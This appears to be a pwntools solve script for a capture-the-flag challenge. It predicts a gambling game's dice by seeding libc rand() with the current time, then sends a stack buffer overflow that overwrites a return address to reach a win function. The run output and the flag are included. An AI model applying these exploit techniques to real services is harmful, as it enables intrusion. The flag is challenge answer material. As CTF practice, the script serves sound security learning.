from ctypes import CDLL
libc = CDLL('libc.so.6')
# Adjust the +1 if it doesn't work
libc.srand(libc.time(0)+1)

from pwn import *
r = remote('chall-us.pwnable.hk', '20001')

def get_result():
    a = libc.rand() % 6 + 1
    b = libc.rand() % 6 + 1
    c = libc.rand() % 6 + 1
    sum = a + b + c 
    if sum < 3 or sum > 9:
        return 2
    else:
        return 1

bal = 20
goal = 25000000
while bal < goal:
    r.sendline(str(bal).encode('ascii'))
    r.sendline(str(get_result()).encode('ascii'))
    line = r.recvuntil(b'Your balance')
    if b'Sorry' in line:
        print('Seed is wrong, restart script.')
        print('Balance:', bal)
        exit(0)
    bal += bal

# Buffer Overflow
win_addr = 0x0010147c
r.sendline(b'a'*(0x20+8)+p64(win_addr))
r.interactive() # Get the flag!

'''
[+] Opening connection to chall-us.pwnable.hk on port 20001: Done
[*] Switching to interactive mode
 is now $41943040.
Congratulations, you have reached the goal of $25000000!
Now you enter the Charity Gamble Tournament
This is the final round
Win the flag or Lose the game
Enter your guess:You are the god of gamblers!
Here is your flag!
b6actf{y0u_4r3_7h3_60d_0f_64mbl3r5!!!!!}*** stack smashing detected ***: terminated
[*] Got EOF while reading in interactive
$
'''
